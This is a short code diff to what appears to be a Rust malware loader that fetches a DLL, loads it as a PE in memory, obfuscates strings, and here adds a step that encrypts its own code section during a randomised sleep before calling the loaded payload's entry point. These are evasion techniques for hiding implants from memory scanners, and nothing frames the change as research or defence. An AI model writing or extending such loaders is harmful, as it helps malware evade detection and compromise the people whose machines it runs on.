@@ -1,6 +1,7 @@
 mod config;
 mod dll_fetch;
 mod pe_loader;
+mod sleep_obfuscation;
 
 use config::LoaderConfig;
 use obfstr::obfstr;
@@ -93,7 +94,13 @@ fn main() {
         }
     };
 
-    // 8. Call entry point with config JSON
+    // 8. Obfuscated sleep (random 1-5s delay, encrypts .text while sleeping)
+    {
+        let delay_ms = 1000 + (rand::random::<u64>() % 4000);
+        sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
+    }
+
+    // 9. Call entry point with config JSON
     let config_bytes = loader_cfg.config_json.as_bytes();
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
